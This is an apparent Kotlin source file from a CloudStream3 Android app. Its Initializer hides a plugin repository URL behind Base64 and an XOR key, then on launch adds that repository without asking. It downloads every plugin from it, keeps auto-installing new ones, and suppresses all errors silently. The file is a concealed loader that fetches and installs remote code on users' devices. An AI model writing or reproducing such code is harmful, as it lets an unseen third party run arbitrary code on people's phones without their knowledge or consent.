package com.lagradost.cloudstream3

import android.app.Activity
import android.util.Base64
import androidx.lifecycle.lifecycleScope
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.plugins.PluginManager
import com.lagradost.cloudstream3.ui.settings.extensions.PluginsViewModel
import com.lagradost.cloudstream3.ui.settings.extensions.RepositoryData
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

object Initializer {

    const val NEED_AUTO_DOWNLOAD = "need_auto_download_v1"
    private const val AUTO_REPO_FLAG = "auto_repo_added_v1"

    private const val P1 = "CxgbBRdKQ04LAhtBEg0EBBQb"
    private const val P2 = "Fh8KBwcfAhUcDRhBFgsdQwUM"
    private const val P3 = "EQNWR0s1FBU6DwMaEUsdDQgX"
    private const val P4 = "TB4KBQteBhIWDQ=="

    private fun repoUrl(): String {
        val key = "cloudplay".toByteArray()
        val data = Base64.decode(P1 + P2 + P3 + P4, Base64.DEFAULT)
        return data.mapIndexed { i, b -> (b.toInt() xor key[i % key.size].toInt()).toByte() }
            .toByteArray().toString(Charsets.UTF_8)
    }

    fun start(activity: Activity) {
        val prefs = activity.getSharedPreferences("cloudstream", Activity.MODE_PRIVATE)
        val repo = RepositoryData(name = "ExtCloud", url = repoUrl(), iconUrl = null)

        activity.lifecycleScope.launch(Dispatchers.Main) {
            try {
                // Tambah repo sekali
                if (!prefs.getBoolean(AUTO_REPO_FLAG, false)) {
                    RepositoryManager.addRepository(repo)
                    PluginsViewModel.downloadAll(activity, repo.url, null)

                    prefs.edit()
                        .putBoolean(AUTO_REPO_FLAG, true)
                        .putBoolean(NEED_AUTO_DOWNLOAD, false)
                        .apply()
                }

                // Auto-download plugin baru
                val newPlugins = getNewPlugins(activity, repo.url)
                if (newPlugins.isNotEmpty()) {
                    PluginsViewModel.downloadAll(activity, repo.url, newPlugins)
                }

            } catch (_: Throwable) {
                // silent
            }
        }
    }

    private suspend fun getNewPlugins(activity: Activity, repoUrl: String): List<String> =
        withContext(Dispatchers.IO) {
            val all = RepositoryManager.getRepoPlugins(repoUrl)?.map { it.second.internalName } ?: emptyList()
            all.filter { name -> !PluginManager.getPluginPath(activity, name, repoUrl).exists() }
        }
}